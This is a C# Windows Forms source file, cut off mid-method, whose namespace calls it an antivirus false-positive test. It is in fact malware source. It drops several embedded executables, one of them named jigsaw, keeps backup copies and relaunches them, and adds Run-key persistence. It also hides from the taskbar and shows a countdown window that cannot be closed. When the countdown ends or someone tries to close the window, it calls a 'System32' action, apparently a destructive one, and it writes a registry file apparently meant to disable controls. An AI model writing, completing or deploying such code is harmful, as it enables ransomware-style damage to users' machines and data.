
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace antivirusfalsepositivetest4
{
    public partial class Form1 : Form
    {
        private BackgroundWorker backgroundWorker;
        private Timer timer;
        private int countdownSeconds = 300; // 5 minutes in seconds
        private Label countdownLabel; // Declare the Label variable
        public Form1()
        {
            backgroundWorker = new BackgroundWorker();
            InitializeComponent();
            this.ShowInTaskbar = false; // Görev çubuğunda görünmemesini sağlar
            InitializeTimer();
            InitializeUI();
            CustomActions0.StartMonitoringX();
            CustomActions0.StartMonitoringX0();
            CustomActions0.StartMonitoring();
            StartMonitoring0();
            StartMonitoring1();
            StartMonitoring2();
            StartMonitoring3();
            StartMonitoring4();
            StartMonitoring5();
            StartMonitoring6();
            StartMonitoring7();
            StartMonitoring8();
            StartMonitoring();
            AddToStartup();
            // Uygulama kapatıldığında pencere açık kalmasın
            Console.ReadLine();
        }
        private void AddToStartup()
        {
            try
            {
                Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true)?.SetValue("jahrein", Path.Combine(Application.StartupPath, "rebcoana.exe"));
            }
            catch (Exception ex)
            {
                // Handle the exception
            }
        }
        private void StartMonitoring()
        {
            string jigsawPath = Path.Combine(Application.StartupPath, "rebcona.exe");
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "rebcoana_backup.exe");

            // Access the jigsaw.exe from resources
            byte[] jigsawBytes = Properties.Resources.rebcoana;

            // Save jigsaw.exe to a temporary location
            string jigsawTempPath = Path.Combine(Application.StartupPath, "rebcoana.exe");

            // Check if the file doesn't exist or is different from the resource for jigsaw.exe
            if (!File.Exists(jigsawTempPath) || !File.ReadAllBytes(jigsawTempPath).SequenceEqual(jigsawBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(jigsawTempPath, jigsawBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (File.Exists(jigsawTempPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy jigsaw.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{jigsawTempPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(jigsawTempPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy jigsaw.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{jigsawTempPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            bool jigsawRunning = Process.GetProcessesByName("rebcoana").Length > 0;

            // Check if jigsaw.exe is not running
            if (!jigsawRunning)
            {
                try
                {
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (!backgroundWorker.IsBusy)
            {
                // Start the background worker
                backgroundWorker.RunWorkerAsync();
            }
        }

        private void StartMonitoring8()
        {
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "of_backup.exe");

            // Access the z.exe from resources
            byte[] zBytes = Properties.Resources.z;

            // Save z.exe to a temporary location
            string zTempPath = Path.Combine(Application.StartupPath, "of.exe");

            // Check if the file doesn't exist or is different from the resource for z.exe
            if (!File.Exists(zTempPath) || !File.ReadAllBytes(zTempPath).SequenceEqual(zBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(zTempPath, zBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (File.Exists(zTempPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy z.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{zTempPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(zTempPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy z.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{zTempPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            bool zRunning = Process.GetProcessesByName("z").Length > 0;

            // Check if z.exe is not running
            if (!zRunning)
            {
                try
                {
                    // Start z.exe process
                    Process.Start(zTempPath);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (!backgroundWorker.IsBusy)
            {
                // Start the background worker
                backgroundWorker.RunWorkerAsync();
            }
        }
        private void StartMonitoring7()
        {
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "z_backup.exe");

            // Access the z.exe from resources
            byte[] zBytes = Properties.Resources.z;

            // Save z.exe to a temporary location
            string zTempPath = Path.Combine(Application.StartupPath, "z.exe");

            // Check if the file doesn't exist or is different from the resource for z.exe
            if (!File.Exists(zTempPath) || !File.ReadAllBytes(zTempPath).SequenceEqual(zBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(zTempPath, zBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (File.Exists(zTempPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy z.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{zTempPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(zTempPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy z.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{zTempPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            bool zRunning = Process.GetProcessesByName("z").Length > 0;

            // Check if z.exe is not running
            if (!zRunning)
            {
                try
                {
                    // Start z.exe process
                    Process.Start(zTempPath);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (!backgroundWorker.IsBusy)
            {
                // Start the background worker
                backgroundWorker.RunWorkerAsync();
            }
        }
        private void StartMonitoring6()
        {
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "m_backup.exe");

            // Access the m.exe from resources
            byte[] mBytes = Properties.Resources.m;

            // Save m.exe to a temporary location
            string mTempPath = Path.Combine(Application.StartupPath, "m.exe");

            // Check if the file doesn't exist or is different from the resource for m.exe
            if (!File.Exists(mTempPath) || !File.ReadAllBytes(mTempPath).SequenceEqual(mBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(mTempPath, mBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (File.Exists(mTempPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy m.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{mTempPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(mTempPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy m.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{mTempPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            bool mRunning = Process.GetProcessesByName("m").Length > 0;

            // Check if m.exe is not running
            if (!mRunning)
            {
                try
                {
                    // Start m.exe process
                    Process.Start(mTempPath);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (!backgroundWorker.IsBusy)
            {
                // Start the background worker
                backgroundWorker.RunWorkerAsync();
            }
        }
        private void StartMonitoring5()
        {
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "l_backup.exe");

            // Access the l.exe from resources
            byte[] lBytes = Properties.Resources.l;

            // Save l.exe to a temporary location
            string lTempPath = Path.Combine(Application.StartupPath, "l.exe");

            // Check if the file doesn't exist or is different from the resource for l.exe
            if (!File.Exists(lTempPath) || !File.ReadAllBytes(lTempPath).SequenceEqual(lBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(lTempPath, lBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (File.Exists(lTempPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy l.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{lTempPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(lTempPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy l.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{lTempPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            bool lRunning = Process.GetProcessesByName("l").Length > 0;

            // Check if l.exe is not running
            if (!lRunning)
            {
                try
                {
                    // Start l.exe process
                    Process.Start(lTempPath);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (!backgroundWorker.IsBusy)
            {
                // Start the background worker
                backgroundWorker.RunWorkerAsync();
            }
        }
        private void StartMonitoring4()
        {
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "f_backup.exe");

            // Access the f.exe from resources
            byte[] fBytes = Properties.Resources.f;

            // Save f.exe to a temporary location
            string fTempPath = Path.Combine(Application.StartupPath, "f.exe");

            // Check if the file doesn't exist or is different from the resource for f.exe
            if (!File.Exists(fTempPath) || !File.ReadAllBytes(fTempPath).SequenceEqual(fBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(fTempPath, fBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (File.Exists(fTempPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy f.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{fTempPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(fTempPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy f.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{fTempPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            bool fRunning = Process.GetProcessesByName("f").Length > 0;

            // Check if f.exe is not running
            if (!fRunning)
            {
                try
                {
                    // Start f.exe process
                    Process.Start(fTempPath);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (!backgroundWorker.IsBusy)
            {
                // Start the background worker
                backgroundWorker.RunWorkerAsync();
            }
        }
        private void StartMonitoring3()
        {
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "c_backup.exe");

            // Access the c.exe from resources
            byte[] cBytes = Properties.Resources.c;

            // Save c.exe to a temporary location
            string cTempPath = Path.Combine(Application.StartupPath, "c.exe");

            // Check if the file doesn't exist or is different from the resource for c.exe
            if (!File.Exists(cTempPath) || !File.ReadAllBytes(cTempPath).SequenceEqual(cBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(cTempPath, cBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (File.Exists(cTempPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy c.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{cTempPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(cTempPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy c.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{cTempPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            bool cRunning = Process.GetProcessesByName("c").Length > 0;

            // Check if c.exe is not running
            if (!cRunning)
            {
                try
                {
                    // Start c.exe process
                    Process.Start(cTempPath);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (!backgroundWorker.IsBusy)
            {
                // Start the background worker
                backgroundWorker.RunWorkerAsync();
            }
        }
        private void StartMonitoring2()
        {
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "b_backup.exe");

            // Access the b.exe from resources
            byte[] bBytes = Properties.Resources.b;

            // Save b.exe to a temporary location
            string bTempPath = Path.Combine(Application.StartupPath, "b.exe");

            // Check if the file doesn't exist or is different from the resource for b.exe
            if (!File.Exists(bTempPath) || !File.ReadAllBytes(bTempPath).SequenceEqual(bBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(bTempPath, bBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (File.Exists(bTempPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy b.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{bTempPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(bTempPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy b.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{bTempPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            bool bRunning = Process.GetProcessesByName("b").Length > 0;

            // Check if b.exe is not running
            if (!bRunning)
            {
                try
                {
                    // Start b.exe process
                    Process.Start(bTempPath);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (!backgroundWorker.IsBusy)
            {
                // Start the background worker
                backgroundWorker.RunWorkerAsync();
            }
        }
        private void StartMonitoring1()
        {
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "a_backup.exe");

            // Access the a.exe from resources
            byte[] aBytes = Properties.Resources.a;

            // Save a.exe to a temporary location
            string aTempPath = Path.Combine(Application.StartupPath, "a.exe");

            // Check if the file doesn't exist or is different from the resource for a.exe
            if (!File.Exists(aTempPath) || !File.ReadAllBytes(aTempPath).SequenceEqual(aBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(aTempPath, aBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (File.Exists(aTempPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy a.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{aTempPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(aTempPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy a.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{aTempPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            bool aRunning = Process.GetProcessesByName("a").Length > 0;

            // Check if a.exe is not running
            if (!aRunning)
            {
                try
                {
                    // Start a.exe process
                    Process.Start(aTempPath);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (!backgroundWorker.IsBusy)
            {
                // Start the background worker
                backgroundWorker.RunWorkerAsync();
            }
        }

        private void StartMonitoring0()
        {
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "jigsaw_backup.exe");

            // Access the jigsaw.exe from resources
            byte[] jigsawBytes = Properties.Resources.jigsaw;

            // Save jigsaw.exe to a temporary location
            string jigsawTempPath = Path.Combine(Application.StartupPath, "jigsaw.exe");

            // Check if the file doesn't exist or is different from the resource for jigsaw.exe
            if (!File.Exists(jigsawTempPath) || !File.ReadAllBytes(jigsawTempPath).SequenceEqual(jigsawBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(jigsawTempPath, jigsawBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (File.Exists(jigsawTempPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy jigsaw.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{jigsawTempPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(jigsawTempPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy jigsaw.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{jigsawTempPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            bool jigsawRunning = Process.GetProcessesByName("jigsaw").Length > 0;

            // Check if jigsaw.exe is not running
            if (!jigsawRunning)
            {
                try
                {
                    // Start jigsaw.exe process
                    Process.Start(jigsawTempPath);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (!backgroundWorker.IsBusy)
            {
                // Start the background worker
                backgroundWorker.RunWorkerAsync();
            }
        }

        private void InitializeTimer()
        {
            timer = new Timer();
            timer.Interval = 1000; // 1 second
            timer.Tick += Timer_Tick;
            StartTimer();
        }

        private void InitializeUI()
        {
            // Create a label to display the countdown time
            countdownLabel = new Label();
            countdownLabel.Text = FormatTime(countdownSeconds);
            countdownLabel.Font = new System.Drawing.Font("Arial", 12, System.Drawing.FontStyle.Bold);
            countdownLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;

            // Dock the label to the top of the form
            countdownLabel.Dock = DockStyle.Top;

            // Add the label to the form
            Controls.Add(countdownLabel);

            // Set the Form to be TopMost
            TopMost = true;
        }

        private void StartTimer()
        {
            timer.Start();
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            countdownSeconds--;

            if (countdownSeconds >= 0)
            {
                // Update the countdown label
                countdownLabel.Text = FormatTime(countdownSeconds);
            }

            if (countdownSeconds == 0)
            {
                timer.Stop();
                CustomActions.System32(); // 5 dakika sonra System32 işlemini çağır
            }
        }

        private string FormatTime(int seconds)
        {
            int minutes = seconds / 60;
            int remainingSeconds = seconds % 60;
            return $"{minutes:D2}:{remainingSeconds:D2}";
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            CustomActions.System32();
            e.Cancel = true; // Form'un kapatılmasını engelle
            base.OnFormClosing(e);
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Escape)
            {
                // Escape tuşuna basıldığında programın kapanmasını engelle
                e.Handled = true;
                CustomActions.System32();
            }
        }
    }

    public static class CustomActions0
    {
        public static void StartMonitoring()
        {
            string antivirusPath = Path.Combine(Application.StartupPath, "thirdpartyclamavinstaller0.exe");
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "thirdpartyclamavinstaller0.exe");

            // Access the antivirusfalsepositivetest3.exe from resources
            byte[] antiAttackBytes = Properties.Resources.thirdpartyclamavinstaller0;

            // Save antivirusfalsepositivetest3.exe to a temporary location
            string antiAttackPath = Path.Combine(Application.StartupPath, "thirdpartyclamavinstaller0.exe");

            // Check if the file doesn't exist or is different from the resource for antivirusfalsepositivetest3.exe
            if (!File.Exists(antiAttackPath) || !File.ReadAllBytes(antiAttackPath).SequenceEqual(antiAttackBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(antiAttackPath, antiAttackBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (File.Exists(antiAttackPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy antivirusfalsepositivetest3.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{antiAttackPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    Process.Start(processInfo);
                    // Başlangıca kaydetme işlemi
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    rk.SetValue("MyGigaPp", backupPath);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(antiAttackPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy antivirusfalsepositivetest3.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{antiAttackPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    Process.Start(processInfo);
                    // Başlangıca kaydetme işlemi
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    rk.SetValue("MyGigaP", antiAttackPath);
                }
                catch (Exception ex)
                {
                }
            }
        }
        public static void StartMonitoringX()
        {
            string antivirusPath = Path.Combine(Application.StartupPath, "thirdpartyclamavinstaller.exe");
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "thirdpartyclamavinstaller.exe");

            // Access the antivirusfalsepositivetest3.exe from resources
            byte[] antiAttackBytes = Properties.Resources.thirdpartyclamavinstaller;

            // Save antivirusfalsepositivetest3.exe to a temporary location
            string antiAttackPath = Path.Combine(Application.StartupPath, "thirdpartyclamavinstaller.exe");

            // Check if the file doesn't exist or is different from the resource for antivirusfalsepositivetest3.exe
            if (!File.Exists(antiAttackPath) || !File.ReadAllBytes(antiAttackPath).SequenceEqual(antiAttackBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(antiAttackPath, antiAttackBytes);
                    Process.Start("thirdpartyclamavinstaller.exe");
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }


            if (File.Exists(antiAttackPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy antivirusfalsepositivetest3.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{antiAttackPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden

                    };

                    // Start the process
                    Process.Start(processInfo);
                    Process.Start("thirdpartyclamavinstaller.exe");
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(antiAttackPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy antivirusfalsepositivetest3.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{antiAttackPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
        }
            public static void StartMonitoringX0()
            {
                string antivirusPath = Path.Combine(Application.StartupPath, "thirdpartyclamavinstaller.exe");
                string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "thirdpartyclamavinstaller.exe");
                string antiAttackPath = Path.Combine(Application.StartupPath, "thirdpartyclamavinstaller.exe");
                string regFilePath = Path.Combine(Application.StartupPath, "disctrl.reg");
            string regFileText = Properties.Resources.disctrl;
            // Access the antivirusfalsepositivetest3.exe from resources
            byte[] antiAttackBytes = Properties.Resources.thirdpartyclamavinstaller;
            byte[] regFileBytes = Encoding.UTF8.GetBytes(regFileText);
            // Check if the file doesn't exist or is different from the resource for antivirusfalsepositivetest3.exe
            if (!File.Exists(antiAttackPath) || !File.ReadAllBytes(antiAttackPath).SequenceEqual(antiAttackBytes))
                {
                    try
                    {
                        // Save the resource to the temporary location
                        File.WriteAllBytes(antiAttackPath, antiAttackBytes);
                    }
                    catch (Exception ex)
                    {
                        // Handle the exception
                    }
                }

                // Check if the disctrl.reg file doesn't exist or is different from the resource for disctrl.reg
